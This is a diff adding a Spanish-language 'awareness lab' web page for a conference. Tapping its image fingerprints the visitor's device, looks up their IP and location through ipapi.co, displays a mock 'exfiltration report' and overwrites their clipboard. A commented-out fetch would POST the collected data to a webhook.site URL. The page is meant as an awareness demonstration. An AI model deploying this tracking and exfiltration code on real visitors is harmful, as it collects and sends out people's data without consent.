@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio de Concientización - Ciberseguridad</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f172a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            color: #f8fafc;
+            text-align: center;
+        }
+        .container {
+            max-width: 90%;
+            width: 380px;
+            background: #1e293b;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border: 1px solid #334155;
+        }
+        img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        img:active {
+            transform: scale(0.97);
+        }
+        p.instruction {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-top: 15px;
+        }
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 1000; 
+            left: 0;
+            top: 0;
+            width: 100%; 
+            height: 100%; 
+            background-color: rgba(0,0,0,0.7); 
+            align-items: center;
+            justify-content: center;
+        }
+        .notepad-window {
+            background: #ffffff;
+            width: 90%;
+            max-width: 340px;
+            border: 2px solid #005fb8;
+            border-radius: 6px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            overflow: hidden;
+            text-align: left;
+        }
+        .notepad-titlebar {
+            background: #005fb8;
+            color: white;
+            padding: 8px 12px;
+            font-size: 13px;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .notepad-content {
+            padding: 12px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            color: #111;
+            white-space: pre-wrap;
+            word-break: break-word;
+            background: #fff;
+            max-height: 250px;
+            overflow-y: auto;
+            line-height: 1.4;
+        }
+        .notepad-footer {
+            background: #f1f5f9;
+            padding: 8px;
+            text-align: right;
+            border-top: 1px solid #cbd5e1;
+        }
+        .close-btn {
+            background: #005fb8;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Conferencia Activa</h2>
+        <!-- Cambia 'foto.png' por el nombre real de tu imagen PNG -->
+        <img src="foto.png" alt="Imagen del evento" id="targetImg">
+        <p class="instruction">👆 Toca la imagen para validar el acceso.</p>
+    </div>
+
+    <!-- Ventana simulada de Análisis de Telemetría -->
+    <div id="notepadModal" class="modal">
+        <div class="notepad-window">
+            <div class="notepad-titlebar">
+                <span>telemetria_dispositivo.log</span>
+                <span>✖</span>
+            </div>
+            <div class="notepad-content" id="telemetryData">
+                Cargando telemetría del dispositivo...
+            </div>
+            <div class="notepad-footer">
+                <button class="close-btn" onclick="cerrarMensaje()">Cerrar</button>
+            </div>
+        </div>
+    </div>
+
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <script>
+        const img = document.getElementById('targetImg');
+        const modal = document.getElementById('notepadModal');
+        const telemetryBox = document.getElementById('telemetryData');
+
+        img.addEventListener('click', async () => {
+            modal.style.display = 'flex';
+            telemetryBox.innerText = "[*] Analizando handshake...\n[*] Extrayendo huella digital del equipo...\n";
+
+            // 1. Recolección de datos técnicos del celular del asistente
+            let plataforma = navigator.platform || "Desconocido";
+            let userAgent = navigator.userAgent;
+            let cores = navigator.hardwareConcurrency || "No disponible";
+            let memoria = navigator.deviceMemory ? navigator.deviceMemory + " GB aprox" : "Restringido";
+            let resolucion = `${window.screen.width}x${window.screen.height}`;
+            let colorDepth = window.screen.colorDepth + " bits";
+            let idioma = navigator.language || "Desconocido";
+            let conexion = navigator.connection ? (navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)") : "No soportado";
+
+            let osType = "Dispositivo móvil genérico";
+            if (/android/i.test(userAgent)) osType = "Android";
+            else if (/iPad|iPhone|iPod/.test(userAgent)) osType = "iOS (Apple)";
+
+            // 2. Obtener IP y ubicación pública
+            let ipInfo = "Consultando IP...";
+            let datosExfiltracion = {
+                os: osType,
+                resolucion: resolucion,
+                navegador: userAgent,
+                idioma: idioma
+            };
+
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                ipInfo = `${data.ip} (${data.city}, ${data.country_name})`;
+                datosExfiltracion.ip = data.ip;
+                datosExfiltracion.ubicacion = `${data.city}, ${data.country_name}`;
+
+                // OPCIONAL: Si deseas que los datos lleguen a tu servidor de pruebas, 
+                // reemplaza la URL de abajo por tu enlace de Webhook.site
+                /*
+                await fetch('https://webhook.site/7a591fcc-9fba-4031-b06c-53203a9fc2f0', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(datosExfiltracion)
+                });
+                */
+
+            } catch (e) {
+                ipInfo = "Oculta / Restringida por red";
+            }
+
+            // 3. Mostrar el reporte final en pantalla tras un pequeño retraso visual
+            setTimeout(() => {
+                let report = `=== REPORTE DE EXFILTRACIÓN ===\n`;
+                report += `[+] Mensaje: Hola bienvenido a esta conferencia\n`;
+                report += `----------------------------------------\n`;
+                report += `[i] Sistema OS: ${osType}\n`;
+                report += `[i] IP Pública aprox: ${ipInfo}\n`;
+                report += `[i] Resolución Pantalla: ${resolucion}\n`;
+                report += `[i] Núcleos CPU lógicos: ${cores}\n`;
+                report += `[i] Memoria RAM: ${memoria}\n`;
+                report += `[i] Red / Conexión: ${conexion}\n`;
+                report += `----------------------------------------\n`;
+                report += `[!] ALERTA: Datos exfiltrados vía web interactiva.`;
+
+                telemetryBox.innerText = report;
+
+                // Copiar al portapapeles si el navegador lo permite
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText("Hola bienvenido a esta conferencia - Dispositivo mapeado").catch(() => {});
+                }
+            }, 600);
+        });
+
+        function cerrarMensaje() {
+            modal.style.display = 'none';
+        }
+
+        window.addEventListener('click', (event) => {
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+    </script>
+
+</body>
+</html>
